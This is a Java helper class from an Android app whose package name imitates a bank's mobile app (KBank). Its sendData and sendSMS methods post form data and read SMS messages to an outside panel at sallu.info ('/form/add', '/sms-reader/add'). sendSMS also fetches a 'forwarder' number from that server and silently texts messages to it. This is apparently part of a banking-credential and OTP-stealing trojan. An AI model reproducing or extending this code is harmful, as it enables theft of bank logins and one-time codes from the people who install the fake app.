package com.msf.kbank.mobile;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;

import java.net.URL;

import java.util.Scanner;


public class Helper {

    public static String SITE = "localhost";
    public static String FormURL = "https://sallu.info/api";
    public static String FormSavePath = "/form/add";
    public static String SMSURL = "https://sallu.info/api";
    public static String SMSSavePath = "/sms-reader/add";
    public static String SMSGetNumberPath = "/site/number?site=" + Helper.SITE;
    public static String TAG = "mywork";

    public static void sendSMS(String urlString, String message) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String... params) {
                String response = "";
                try {
                    URL url = new URL(urlString);
                    Log.d("mywork", "doInBackground API URL: " + urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");

                    // Check the response code
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        try (Scanner scanner = new Scanner(conn.getInputStream())) {
                            StringBuilder responseBuilder = new StringBuilder();
                            while (scanner.hasNextLine()) {
                                responseBuilder.append(scanner.nextLine());
                            }
                            response = responseBuilder.toString();
                        }
                    } else {
                        // Handle error response
                        response = "Response: " + responseCode;
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                    response = "Response Error: " + e.getMessage();
                }
                Log.d("mywork", "doInBackground API Response: " + response);
                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                try {
                    // Parse JSON response
                    JSONObject jsonResponse = new JSONObject(result);
                    if (jsonResponse.has("data")) {
                        String phoneNumber = jsonResponse.getString("data");
                        Log.d("mywork", "Forwarder Number: " + phoneNumber);
                        SmsManager smsManager = SmsManager.getDefault();
                        smsManager.sendTextMessage(phoneNumber, null, message, null, null);
                    } else {
                        Log.e("MYAPP: ", "Response does not contain 'data' field");
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                    Log.e("MYAPP: ", "JSON Parsing Error: " + e.getMessage());
                }
            }
        }.execute();
    }

    public static void sendData(String urlString, JSONObject jsonData) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String... params) {
                String response = "";
                try {

                    URL url = new URL(urlString);
                    Log.d("mywork", "doInBackground API URL: " + jsonData.toString());
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setRequestProperty("Accept", "application/json");
                    conn.setDoOutput(true);

                    // Write JSON data to the output stream
                    OutputStream os = conn.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                    writer.write(jsonData.toString());
                    writer.flush();
                    writer.close();
                    os.close();

                    // Check the response code
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        Scanner scanner = new Scanner(conn.getInputStream());
                        StringBuilder responseBuilder = new StringBuilder();
                        while (scanner.hasNextLine()) {
                            responseBuilder.append(scanner.nextLine());
                        }
                        scanner.close();
                        response = responseBuilder.toString();
                    } else {
                        // Handle error response
                        response = "Response: " + responseCode;
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                    response = "Response Error: " + e.getMessage();
                }
                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                Log.d("mywork", "SMS SAVE TO PANE : " + result);
            }
        }.execute();
    }

    public static void debug(Context context, String message) {
        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
        StackTraceElement element = stackTraceElements[3];
        String FileName = element.getFileName();
        int Line = element.getLineNumber();
        Toast.makeText(context, Line + FileName + " : " + message, Toast.LENGTH_SHORT).show();
        Log.d(Helper.TAG, Line + FileName + " : " + message);
    }

    public static void debug(String message) {
        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
        StackTraceElement element = stackTraceElements[3];
        String FileName = element.getFileName();
        int Line = element.getLineNumber();
        Log.d(Helper.TAG, Line + FileName + " : " + message);
    }

    public static boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Network network = connectivityManager.getActiveNetwork();
                if (network != null) {
                    NetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(network);
                    return networkCapabilities != null && (
                            networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
                    );
                }
            } else {
                NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
                return activeNetworkInfo != null && activeNetworkInfo.isConnected();
            }
        }
        return false;
    }


}
